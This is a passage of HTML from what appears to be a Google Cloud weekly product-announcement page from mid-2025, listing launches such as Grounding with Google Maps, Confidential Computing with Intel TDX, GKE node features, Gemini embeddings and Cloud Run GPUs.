multi-agent AI systems, see this reference architecture guide: <a href=\"https://cloud.google.com/architecture/choose-design-pattern-agentic-ai-system\" rel=\"noopener\" target=\"_blank\">Design a multi-agent AI system in Google cloud</a>. The example architecture in this guide showcases a couple of agent patterns: sequential, and loop. For a comprehensive review of all the possible agent design patterns and for help with choosing patterns that are appropriate for your use cases, see this design guide: <a href=\"https://cloud.google.com/architecture/choose-design-pattern-agentic-ai-system\" rel=\"noopener\" target=\"_blank\">Choose a design pattern for your agentic AI system</a>.</li>\n</ul>\n<h3>Sept 29 - Oct 3</h3>\n<ul>\n<li><strong>Announcing Koog Supports for Agent2Agent protocol (A2A)<br /></strong>The future of interconnected AI is here. We're thrilled to announce that Koog now supports A2A, a protocol that lets agents talk directly, securely, and seamlessly across companies and clouds. For Kotlin developers, this unlocks a new era of powerful, enterprise-grade AI. Build sophisticated agents that automatically discover and collaborate with other services, all while calling on Google Cloud's state-of-the-art models like Gemini directly from your workflows. Stop building bridges and start creating truly intelligent, interconnected systems today. <a href=\"https://www.google.com/url?q=https%3A%2F%2Fblog.jetbrains.com%2Fai%2F2025%2F10%2Fkoog-a2a-building-connected-ai-agents-in-kotlin%2F\" rel=\"noopener\" target=\"_blank\">Learn more about building with Koog, A2A, and Google Cloud</a><span>.</span></li>\n</ul>\n<h3>Sept 15 - 19</h3>\n<ul>\n<li><span style=\"vertical-align: baseline;\"><strong>Your AI is Now a Local Expert: Grounding with Google Maps is GA</strong><br /></span>We are excited to announce the General Availability (GA) of Grounding with Google Maps in Vertex AI. This feature lets developers build generative AI applications that are connected to real-world, up-to-date information from Google Maps, using its data on over 250 million places worldwide.<br /><br />To learn more and get started, visit our <a href=\"https://cloud.google.com/vertex-ai/generative-ai/docs/grounding/grounding-with-google-maps\"><span style=\"text-decoration: underline; vertical-align: baseline;\">documentation</span></a><span style=\"vertical-align: baseline;\"> and check out our</span> <a href=\"https://goog-maps-grounding-demo-h75yp5b4ia-uc.a.run.app/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">demo</span></a><span style=\"vertical-align: baseline;\">.</span></li>\n<li><a href=\"https://discuss.google.dev/t/production-ready-yolo-model-training-serving-workflow-on-vertex-ai/263788\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\"><strong>Production-ready YOLO model training serving workflow on Vertex AI</strong></span></a><span style=\"vertical-align: baseline;\"><br /></span>This guide walks you through a complete, automated workflow for training a custom YOLO model on Vertex AI. You'll learn how to use a custom training job, package the model in a custom prediction container, and register it in the Vertex AI Model Registry, making it ready for easy deployment. Best of all, this approach is designed to work directly with existing Vertex AI managed datasets for object detection, meaning you can reuse the same data you're already using for AutoML models.<br /><br /><span style=\"vertical-align: baseline;\">Checkout details on </span><a href=\"https://discuss.google.dev/t/production-ready-yolo-model-training-serving-workflow-on-vertex-ai/263788?u=hill_yu\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">developer forums</span></a></li>\n</ul>\n<h3>Sept 8 - 12</h3>\n<ul>\n<li><span style=\"vertical-align: baseline;\">Scaling Inference To Billions of Users And AI Agents: Discover the architecture required to serve AI models at a planetary scale. This article details how Google Cloud\u2019s ecosystem\u2014from the GKE Inference Gateway for smart load balancing to the power of custom TPUs and open-source engines like vLLM\u2014provides a production-ready path. Move beyond the hype and learn how to build for the next wave of AI. </span><a href=\"https://medium.com/google-cloud/scaling-inference-to-billions-of-users-and-agents-516d5d9f5da7\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Explore the technical deep-dive.</span></a></li>\n<li><span style=\"vertical-align: baseline;\">We're celebrating the one-year anniversary of bringing Confidential Computing with Intel TDX to Google Cloud. We've been shipping new capabilities to help you protect your most sensitive data while it's in use. </span><span style=\"vertical-align: baseline;\">Now Generally Available:</span>\n<ul>\n<li>Confidential GKE Nodes with Intel TDX: Secure entire Kubernetes clusters, node pools, and workloads.</li>\n<li>Confidential Space with Intel TDX: Build secure data clean rooms for collaboration on sensitive information.</li>\n<li>Confidential GPUs: Protect cutting-edge AI workloads with Confidential NVIDIA H100s GPUs on GCE and GKE.<br /><br />We've also expanded Intel TDX to more regions! <a href=\"https://cloud.google.com/blog/products/identity-security/from-clicks-to-clusters-confidential-computing-expands-with-intel-tdx\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Read the blog</span></a></li>\n</ul>\n</li>\n</ul>\n<h3>Aug 25 - 29</h3>\n<ul>\n<li><span style=\"vertical-align: baseline;\">Applied AI for Modern Manufacturers: New original growth series, hosted by </span><a href=\"https://www.linkedin.com/in/jacobrhall\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Jake Hall</span></a><span style=\"vertical-align: baseline;\">, The Manufacturing Millennial, that dives into leading trends, best practices, and what companies are doing right now with AI in manufacturing. Hear from industry thought leaders - </span><a href=\"https://www.linkedin.com/in/rickbullotta\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Rick Bullotta</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://www.linkedin.com/in/jonathanmwise/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Jonathan Wise</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://www.linkedin.com/in/walkerdreynolds\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Walker Reynolds</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://www.linkedin.com/in/berardino-baratta\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Berardino Baratta</span></a><span style=\"vertical-align: baseline;\"> - and Google Cloud experts - </span><a href=\"https://www.linkedin.com/in/praveenrao\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Praveen Rao</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://www.linkedin.com/in/ericlam\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Eric Lam</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://www.linkedin.com/in/dave122/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Dave Nguyen Ph.D</span></a><span style=\"vertical-align: baseline;\">., </span><a href=\"https://www.linkedin.com/in/geoffrey-hirschheim/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Geoffrey Hirschheim</span></a><span style=\"vertical-align: baseline;\">, and </span><a href=\"https://www.linkedin.com/in/jimmya\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Jim Anderson</span></a><span style=\"vertical-align: baseline;\">. Watch Modules 1 and\u00a0 2 now, where we delve into the </span><strong style=\"vertical-align: baseline;\">AI Innovation and trends</strong><span style=\"vertical-align: baseline;\"> and </span><strong style=\"vertical-align: baseline;\">AI Costs and ROI in the Era of Digital Manufacturing</strong><span style=\"vertical-align: baseline;\">. Next module kicks off Tuesday, Sep 2. </span><a href=\"https://cloudonair.withgoogle.com/events/applied-ai-modern-manufacturers?tab=module-3&amp;expand=module:module-text-image-7\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Join now</span></a></li>\n<li>\n<p><a href=\"https://cloud.google.com/blog/products/databases/firestore-with-mongodb-compatibility-is-now-ga\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Firestore with MongoDB compatibility is now generally available (GA)</strong></a><span style=\"vertical-align: baseline;\">: Developers can now build cost-effective, scalable, and highly reliable apps on Firestore's serverless database using a familiar MongoDB-compatible API. With the general availability of Firestore with MongoDB compatibility, the 600,000 active developers within the Firestore community can now use existing MongoDB application code, drivers, and tools, as well as the open-source MongoDB ecosystem, with Firestore's serverless service. Firestore offers benefits like multi-region replication, virtually unlimited scalability, up to 99.999% SLA, single-digit millisecond read performance, integrated Google Cloud governance, and pay-as-you-go pricing. </span><a href=\"https://cloudonair.withgoogle.com/events/firestore-compatibility-in-action?utm_source=twitter&amp;utm_medium=unpaidsoc&amp;utm_campaign=fy25q3-googlecloudtech-web-data-in_feed-no-brand-global&amp;utm_content=-&amp;utm_term=-&amp;linkId=16456513\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Register now</span></a><span style=\"vertical-align: baseline;\"> for the webinar on September 9th for a deep dive into Firestore with MongoDB compatibility.</span></p>\n</li>\n</ul>\n<h3>Aug 18 - 22</h3>\n<ul>\n<li>Earth Engine in BigQuery is now Generally Available, bringing advanced geospatial analytics directly to your BigQuery workflows. <a href=\"https://cloud.google.com/bigquery/docs/raster-data\" rel=\"noopener\" target=\"_blank\">Unlock insights</a> with satellite data!</li>\n</ul>\n<h3>Aug 11 - Aug 15</h3>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">New HPC VM and Slurm-gcp Images: </strong><span style=\"vertical-align: baseline;\">A new HPC VM Image (under the project cloud-hpc-image-public) is now available, featuring a Rocky Linux 8-based image, IntelMPI v2021.16, and RDMA drivers. In partnership with SchedMD, new Slurm images (Slurm 25.05) have also been released. These are based on the latest HPC VM Image and are available for Ubuntu 22.04/24.04 Accelerator Images (ARM/AMD64) and Debian 12. These releases allow for the deployment of Slurm-ready clusters on GCP, providing the advantages of an HPC-optimized and performance-tested foundation. </span><a href=\"https://cloud.google.com/compute/docs/instances/create-hpc-vm\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Read more</span></a><span style=\"vertical-align: baseline;\">.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Scaling our Gemini Embedding model in Vertex AI</strong><span style=\"vertical-align: baseline;\">. Following increased popularity from its General Availability launch in May, we've recently increased quota and input size limits for customers of Vertex AI's most powerful text embedding model, gemini-embedding-001.</span>\n<ul>\n<li><span style=\"vertical-align: baseline;\">Customers can now send up to 250 input texts per request (generating 250 embeddings) instead of only a single piece of text, bringing improved throughput and decreased round-trip network latency to large-scale embedding applications.</span></li>\n<li><span style=\"vertical-align: baseline;\">We've increased quota limits for this model by 10x for most users, allowing hassle-free scaling of embedding applications to millions of tokens per minute and beyond.</span><br /><br /><a href=\"https://cloud.google.com/vertex-ai/generative-ai/docs/embeddings/get-text-embeddings\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Get started</span></a><span style=\"vertical-align: baseline;\"> with Gemini Embeddings today!</span></li>\n</ul>\n</li>\n</ul>\n<h3>Aug 4 - Aug 8</h3>\n<ul>\n<li>\n<p><strong>GKE Node Memory Swap in private preview</strong>: You can now configure swap space on your GKE Standard nodes to provide a crucial buffer against Out-of-Memory (OOM) errors for memory-intensive applications, especially during unexpected usage spikes. Enabling swap can improve workload resilience, reduce pod evictions due to memory pressure, and enhance overall application stability and cost-effectiveness. This feature is currently available in a private preview.</p>\n<ul>\n<li>\n<p>Contact your Google Cloud account team for more information and to request access.</p>\n</li>\n<li>\n<p>If you'd like to see more configurations, please contact your account team or make a feature request on our <a href=\"https://issuetracker.google.com/issues/new?component=187077&amp;template=1162666\" rel=\"noopener\" target=\"_blank\">issue tracker</a>!</p>\n</li>\n</ul>\n</li>\n<li>\n<p><strong>Unlock Peak Performance</strong>: GKE Topology Manager is Now Generally Available: For customers running performance-sensitive workloads like AI/ML and HPC, GKE Topology Manager is now GA and ready to optimize your performance through NUMA alignment. By ensuring CPU, memory, and GPU resources are allocated on the same NUMA node, the Topology Manager minimizes cross-socket latency and maximizes throughput for your most demanding applications. Configure your alignment policies via the NodeConfig API to achieve significant performance gains.</p>\n<ul>\n<li>Achieve these performance gains by configuring your alignment policies via the <a href=\"https://cloud.google.com/kubernetes-engine/docs/how-to/node-system-config\">NodeConfig API</a>.</li>\n<li>If you'd like to see more expansion of Topology manager, please contact your account team or make a feature request on our <a href=\"https://issuetracker.google.com/issues/new?component=187077&amp;template=1162666\" rel=\"noopener\" target=\"_blank\">issue tracker</a>!</li>\n</ul>\n</li>\n<li>\n<p><strong>Fine-Tune at Scale</strong>: A Massive GKE NodeConfig Expansion for All Workloads: GKE has massively expanded node customization capabilities, adding nearly 130 new Sysctl and Kubelet configurations. This gives you finer-grained control for any workload needing node customization, performance requirements, or application-specific tuning. By replacing complex DaemonSets with native controls, you can benefit from enhanced security, high flexibility, faster node startup times, and less operational management.</p>\n<ul>\n<li>Check out our <a href=\"https://cloud.google.com/kubernetes-engine/docs/how-to/node-system-config\">public documentation</a> to learn how to consume these new NodeConfig options.</li>\n<li>If you'd like to see more configurations, please contact your account team or make a feature request on our <a href=\"https://issuetracker.google.com/issues/new?component=187077&amp;template=1162666\" rel=\"noopener\" target=\"_blank\">issue tracker</a>!</li>\n</ul>\n</li>\n<li>\n<p><strong>New capability for managing licenses in Compute Engine</strong>: We are announcing a new capability in Compute Engine which allows users to easily change the OS licenses on their VMs. Users can now append, remove, or replace OS licenses, enabling seamless transitions between license types\u2014such as converting Red Hat Enterprise Linux from pay-as-you-go (PAYG) to bring-your-own subscription (BYOS), or upgrading from Ubuntu to Ubuntu Pro\u2014without needing to redeploy instances. This feature empowers customers to meet their evolving licensing with speed and flexibility. To learn more, <a href=\"https://cloud.google.com/compute/docs/licenses/manage\">read about managing licenses on Compute Engine</a>.</p>\n</li>\n<li>\n<p><strong>GKE Turns 10 Hackathon</strong>: Calling all developers! Google Kubernetes Engine (GKE) is turning 10, and we're celebrating with a hackathon! Join us to build powerful AI agents that interact with microservice applications using Google Kubernetes Engine and Google AI models. Compete for over $50,000 in prizes and demonstrate the power of building agentic AI on GKE.</p>\n<ul>\n<li>Submissions are open from Aug 18, 2025 to Sept, 22 2025</li>\n<li>Learn more and register: <a href=\"https://gketurns10.devpost.com/\" rel=\"noopener\" target=\"_blank\">gketurns10.devpost.com</a></li>\n</ul>\n</li>\n</ul>\n<h3>Jul 28 - Aug 1</h3>\n<ul>\n<li><strong>Now GA: C4 VMs with Local SSD, bare metal, and larger shapes, on Intel Xeon 6: </strong>C4's expanded shapes are now GA! This expansion introduces C4 shapes with Google\u2019s next-gen Titanium Local SSD, C4 bare metal instances, and new extra-large shapes, all powered by the latest Intel Xeon 6 processors, Granite Rapids. We\u2019re excited to be the first leading hyperscaler to bring Xeon 6 to customers, delivering performance gains of up to 30% for general compute and up to 60% for ML recommendation workloads, and up to 35% lower access latency on Titanium Local SSD shapes. Learn more <a href=\"https://cloud.google.com/blog/products/compute/c4-vms-based-on-intel-6th-gen-xeon-granite-rapids-now-ga\" rel=\"noopener\" target=\"_blank\">here</a>!</li>\n</ul>\n<h3>Jul 14 - 18</h3>\n<ul>\n<li><strong>DMS SQL Server to PostgreSQL migrations are now generally available!\u00a0</strong>Accelerate your SQL Server modernization to Cloud SQL for PostgreSQL or AlloyDB for PostgreSQL with:\n<ul>\n<li>Automatic database schema and code conversion\u00a0</li>\n<li>Gemini augmented code conversion\u00a0</li>\n<li>Gemini assisted PostgreSQL training and code improvements</li>\n<li>Low-downtime, CDC based data movement</li>\n</ul>\n</li>\n</ul>\n<p><a href=\"https://cloud.google.com/database-migration/docs/sqlserver-to-alloydb/scenario-overview?_gl=1*109toza*_ga*NzM3NjU1NjkwLjE3NTIwNzU4MTE.*_ga_4LYFWVHBEB*czE3NTI0MjE3MzYkbzEkZzEkdDE3NTI0MjIxNTAkajYwJGwwJGgw\" rel=\"noopener\" target=\"_blank\">Learn more</a><span>\u00a0and start your migration journey today!</span></p>\n<h3>Jul 7 - 11</h3>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Level up your AI Agent game with \"The Agent Factory,\" a new video podcast for developers!</strong><span style=\"vertical-align: baseline;\"> We're going beyond the buzz to explore practical design, build, deploy, &amp; management strategies for production-ready AI agents using Google Cloud. Expect code snippets, architecture deep dives, and integrations with open-source frameworks. </span><a href=\"https://goo.gle/theagentfactory\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Subscribe now!</span></a></li>\n</ul>\n<h3>Jun 23 - 27</h3>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Announcing partnership between Maxim AI and Google Cloud's Vertex AI to evaluate agentic applications</strong><span style=\"vertical-align: baseline;\"> \u2014 Maxim AI offers a comprehensive platform to help teams build, evaluate, and observe their AI agents with greater speed and confidence, covering the entire AI lifecycle from prompt engineering to production monitoring. This new partnership deeply integrates Vertex AI's Gen AI evaluation service directly within the Maxim AI environment, allowing users to leverage Gemini to power assistant responses and evaluate them using Vertex AI's comprehensive suite of evaluators. This provides access to metrics such as helpfulness, relevance, safety, and trajectory. The setup allows users to simulate, evaluate, and trace complex multi-turn interactions on Maxim, helping teams bring reliable AI products to market faster through a seamless developer experience. To learn more, check out this</span> <a href=\"https://www.getmaxim.ai/blog/evaluating-a-healthcare-use-case-using-vertex-ai-and-maxim-ai-part-1/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">blog from Maxim AI</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Run non-request workloads at scale with Cloud Run Worker Pools, now in Public Preview </strong><span style=\"vertical-align: baseline;\">\u2014 </span><span style=\"font-style: italic; vertical-align: baseline;\">Looking for the ease-of-use and scalability of serverless, without being limited to HTTP request-driven workloads? </span><a href=\"https://cloud.google.com/run/docs/deploy-worker-pools\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Cloud Run Worker Pools</span></a><span style=\"vertical-align: baseline;\"> provide the same elasticity and high-quality developer experience as Cloud Run Services, but are designed for non-request workloads. Worker Pools are ideal for pull-based use cases like processing messages from Pub/Sub or Kafka, and other backend processing.\u00a0 Check out the</span> <a href=\"https://cloud.google.com/run/docs/overview/what-is-cloud-run\"><span style=\"text-decoration: underline; vertical-align: baseline;\">public documentation</span></a><span style=\"vertical-align: baseline;\"> to learn more about how to choose between Services, Jobs, and Worker Pools. Then give Worker Pools a try by</span> <a href=\"https://cloud.google.com/run/docs/quickstarts/workerpools/deploy-workerpool\"><span style=\"text-decoration: underline; vertical-align: baseline;\">deploying a sample Worker Pool</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Building a Multi-Agent Research Assistant for Financial Analysis with Schroders &amp; Google Cloud </strong><span style=\"vertical-align: baseline;\">\u2014</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">Financial analysts spend hours grappling with ever-increasing volumes of market and company data to extract key signals, combine diverse data sources, and produce company research. To maximise its edge as an active manager, Schroders wants to enable its analysts to shift from data collection to the higher-value strategic thinking that is critical for business scalability and client investment performance.\u00a0 To achieve this, Schroders and Google Cloud collaborated to build a multi-agent research assistant prototype using Vertex AI Agent Builder. Find out more</span> <a href=\"https://cloud.google.com/blog/topics/customers/how-schroders-built-its-multi-agent-financial-analysis-research-assistant\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n</ul>\n<h3>Jun 16 - 20</h3>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Simplify Your Multi-Cloud Strategy with Cloud Location Finder, now in Public Preview</strong><span style=\"vertical-align: baseline;\">: As cloud environments expand beyond traditional architectures to include multiple clouds, managing your infrastructure effectively becomes more complex. Imagine effortlessly accessing consistent and up-to-date location information across different cloud providers, so your multi-cloud applications are designed and optimized with performance, security, and regulatory compliance in mind. </span><span style=\"vertical-align: baseline;\">Today, we are making this a reality with Cloud Location Finder, a new Google Cloud service which provides up-to-date location data across Google Cloud, Amazon Web Services (AWS), Azure, and Oracle Cloud Infrastructure (OCI). Now, you can strategically deploy workloads across different cloud providers with confidence and control. Cloud Location Finder is accessible via REST APIs and gcloud CLI, explore the Cloud Location Finder</span> <a href=\"https://cloud.google.com/location-finder/docs\"><span style=\"text-decoration: underline; vertical-align: baseline;\">documentation</span></a><span style=\"vertical-align: baseline;\"> and</span> <a href=\"https://cloud.google.com/blog/products/compute/googles-cloud-location-finder-unifies-multi-cloud-location-data\"><span style=\"text-decoration: underline; vertical-align: baseline;\">blog</span></a><span style=\"vertical-align: baseline;\"> to learn more.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">SOTA Gemini Text Embedding is Now Generally Available in Vertex AI</strong><span style=\"vertical-align: baseline;\">: We recently launched a new Gemini Embedding text model (gemini-embedding-001) through the </span><a href=\"https://cloud.google.com/vertex-ai/generative-ai/docs/embeddings/get-text-embeddings\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Vertex AI GenAI API</span></a><span style=\"vertical-align: baseline;\">. This groundbreaking model, leveraging Gemini's core language understanding, sets a new benchmark for text embeddings. It's the first unified model to excel across English, multilingual text, and code, outperforming previous models (text-embedding-005, text-multilingual-embedding-002) and achieving top ranking on the </span><a href=\"https://huggingface.co/spaces/mteb/leaderboard\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">MTEB Multilingual leaderboard</span></a><span style=\"vertical-align: baseline;\"> (100+ tasks). Our internal benchmarks demonstrate substantial performance improvements across various industry verticals, including retail, news, finance, healthcare, legal, and code. Detailed results are available in our </span><a href=\"https://deepmind.google/research/publications/157741/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">technical report</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Backup vaults now support disk backups and multi-regions</strong><span style=\"vertical-align: baseline;\">: We\u2019ve added exciting new features to Google Cloud Backup and Disaster Recovery service! You can now secure your Persistent Disk and Hyperdisk backups in backup vaults, protecting them from cyber attacks and accidental data loss. In addition, backup vaults can now be created in multi-region storage locations, maximizing your data resilience and supporting compliance with business continuity requirements. </span><a href=\"https://cloud.google.com/blog/products/storage-data-transfer/backup-vaults-add-support-for-disk-backup-and-multi-region\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Check out the blog to learn more!</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">DeepSeek R1, a powerful 671B parameters model, is now available as a fully managed API on Vertex AI in Preview, making advanced AI capabilities more accessible to developers</strong><span style=\"vertical-align: baseline;\">. This Model as a Service (MaaS) offering eliminates the need for extensive GPU resources and infrastructure management, allowing developers to focus on building applications. DeepSeek R1 on Vertex AI provides a simple, scalable API with features like transparent \"chain-of-thought\" reasoning and enterprise-ready security. It's currently available at no additional cost during the preview, and can be accessed via UI, REST API, or the OpenAI Python API Client Library. </span><a href=\"https://www.googlecloudcommunity.com/gc/Community-Blogs/Introducing-DeepSeek-R1-Model-as-a-service-on-Vertex-AI-Model/ba-p/918265\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Learn more</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n</ul>\n<h3>Jun 9 - 13</h3>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Serverless Spark Now GA in BigQuery: Unified Analytics, Accelerated</strong><span style=\"vertical-align: baseline;\">: </span><a href=\"https://cloud.google.com/blog/products/data-analytics/introducing-google-cloud-serverless-for-apache-spark-in-bigquery\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud Serverless for Apache Spark is now generally available</span></a><span style=\"vertical-align: baseline;\"> in BigQuery, offering a unified developer experience in BigQuery Studio. Run Spark and SQL side-by-side on the same data, powered by the Lightning Engine for up to 3.6x faster performance and enhanced with Gemini productivity. Simplify your data pipelines and accelerate insights with this deeply integrated, zero-ops solution.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Cloud Pub/Sub introduced Pub/Sub Single Message Transforms (SMTs) to make it easy to perform simple data transformations right within Pub/Sub: </strong><span style=\"vertical-align: baseline;\">An overarching goal of Pub/Sub is to simplify streaming architectures. We already greatly simplified data movement with Import Topics and</span> <a href=\"https://cloud.google.com/pubsub/docs/subscriber#export_subscription\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Export Subscriptions</span></a><span style=\"vertical-align: baseline;\">, which removed the need to use additional services for ingesting raw streaming data through Pub/Sub into destinations like</span> <a href=\"https://cloud.google.com/pubsub/docs/bigquery\"><span style=\"text-decoration: underline; vertical-align: baseline;\">BigQuery</span></a><span style=\"vertical-align: baseline;\">. Pub/Sub Single Message Transforms (SMTs), designed to be a suite of features making it easy to validate, filter, enrich, and alter individual messages as they move in real time. The first SMT is available now: JavaScript User-Defined Functions (UDFs), which allows you to perform simple, lightweight modifications to message attributes and/or the data directly within Pub/Sub via snippets of JavaScript code. JavaScript UDFs as the first Single Message Transform is generally available starting today for all users. You'll find the new \"Add Transform\" option in the Google Cloud console when you create a topic or subscription in your Google Cloud project. You can also use gcloud CLI to start using JavaScript Single Message Transforms today.</span></li>\n<li><span style=\"vertical-align: baseline;\">This analysis evaluates the efficiency of fine-tuning a Llama 3-8B model on Vertex AI using both a single A100 GPU and a distributed four-A100 setup with Axolotl. While both methods achieved similar model convergence, the results underscore the power of distributed training. The process, which took 1 day and 20 hours on a single device, was completed in just 11 hours in the distributed environment\u2014a dramatic acceleration. This speed was achieved with consistently high GPU utilization (94%), though at the cost of higher system and GPU memory overhead. </span>For a detailed breakdown of the methodology, resource utilization metrics, and performance curves, you can review the complete work <a href=\"https://medium.com/@kkshitiz_70654/fine-tuning-at-scale-single-device-vs-distributed-training-9eb2a99c3673\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">.</span></li>\n</ul>\n<h3>May 26 - 30</h3>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Cloud Run GPUs are now GA</strong><span style=\"vertical-align: baseline;\">: NVIDIA GPU support for Cloud Run is now generally available, offering a powerful runtime for a variety of use cases that\u2019s also remarkably cost-efficient. Developers can now get on-demand access to GPUs with our serverless runtime, Cloud Run. Follow the footsteps of customers like MidJourney, vivo, and Wayfair.</span> <a href=\"https://cloud.google.com/blog/products/serverless/cloud-run-gpus-are-now-generally-available\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Read blog</span></a><span style=\"vertical-align: baseline;\">.</span></li>\n<li><a href=\"https://cloud.google.com/datastream\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Datastream</strong></a><strong style=\"vertical-align: baseline;\"> now supports MongoDB as a source!</strong><span style=\"vertical-align: baseline;\"> Seamlessly ingest data from MongoDB (Replica Sets, Sharded Clusters, self-hosted, AtlasDB) into BigQuery/Cloud Storage. Enjoy scalable, fully-managed data streaming with backfill and CDC, enabling real-time insights and data-driven decisions.</span> <a href=\"https://cloud.google.com/datastream/docs/sources-mongodb#:~:text=Datastream%20supports%20replicating%20change%20events,This%20page%20contains%20information%20about:\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Link</span></a></li>\n</ul>\n<h3>May 19 - May 23</h3>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Beyond cuts and fades: Understanding narrative flow with Gemini for accurate scene transition detection</strong><span style=\"vertical-align: baseline;\"> \u2014 </span><span style=\"vertical-align: baseline;\">Google Cloud's Gemini models are revolutionizing video understanding by accurately detecting narrative scene transitions, moving beyond simple cuts and fades. This breakthrough technology understands the holistic context of videos by analyzing visual, audio, and textual elements simultaneously. Media companies can now convert passive video assets into structured data, enabling intelligent content discovery, strategic ad placement, and personalized viewing experiences. The result? Up to 38% increased viewer engagement and 27% reduced abandonment rates.\u00a0</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Read more on the</span> <a href=\"https://lendale-vijaylaxmi.medium.com/39c31f32b585\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">medium blog</span></a><span style=\"vertical-align: baseline;\">.\u00a0</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Learn more and access the code repository:</span> <a href=\"https://github.com/GoogleCloudPlatform/generative-ai/pull/1891\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">View Code Repo</span></a></p>\n</li>\n</ul>\n</li>\n<li><strong style=\"vertical-align: baseline;\">Announced at I/O: Deploy AI apps to Cloud Run from AI Studio and MCP </strong><span style=\"vertical-align: baseline;\">\u2014</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">We are making AI deployments easier and more accessible by introducing new ways to deploy your apps to Cloud Run.</span>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">You can deploy applications developed in AI Studio with a click of a button to Cloud Run, including Gemma 3.\u00a0</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Model Context Protocol(MCP) is becoming a popular open protocol standardizing how AI agents interact with other tools. Now with Cloud Run MCP server, you can deploy apps from compatible AI agents like from Claude or VS Code Copilot.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/blog/products/ai-machine-learning/ai-studio-to-cloud-run-and-cloud-run-mcp-server\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Read blog</span></a><span style=\"vertical-align: baseline;\"> to learn more.</span></p>\n</li>\n</ul>\n</li>\n</ul>\n<h3>May 12 - May 16</h3>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: 